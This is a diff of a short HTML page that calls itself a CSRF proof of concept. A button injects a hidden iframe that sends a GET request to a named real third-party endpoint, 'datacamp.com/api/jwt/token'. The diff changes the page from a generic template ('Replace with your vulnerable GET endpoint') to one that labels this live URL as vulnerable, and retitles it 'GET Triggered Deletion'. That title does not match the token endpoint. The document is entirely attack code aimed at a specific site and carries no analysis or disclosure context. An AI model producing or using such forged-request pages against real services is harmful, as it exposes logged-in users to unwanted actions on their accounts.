@@ -2,20 +2,20 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC - Manual GET</title>
+  <title>CSRF PoC - GET Trigger</title>
 </head>
 <body>
-  <h2>CSRF Proof of Concept (Manual Trigger)</h2>
+  <h2>CSRF Proof of Concept (GET Triggered Deletion)</h2>
 
-  <!-- Manual button -->
-  <button onclick="triggerCSRF()">Click to Trigger CSRF</button>
+  <!-- Button to manually trigger the CSRF -->
+  <button onclick="triggerCSRF()">Trigger CSRF</button>
 
   <script>
     function triggerCSRF() {
-      // Create a hidden iframe to send the GET request when button is clicked
+      // Create a hidden iframe to send the GET request
       var iframe = document.createElement("iframe");
       iframe.style.display = "none";
-      iframe.src = "https://www.datacamp.com/api/jwt/token"; // Replace with your vulnerable GET endpoint
+      iframe.src = "https://www.datacamp.com/api/jwt/token"; // <-- vulnerable GET endpoint
       document.body.appendChild(iframe);
 
       alert("CSRF GET Triggered!");
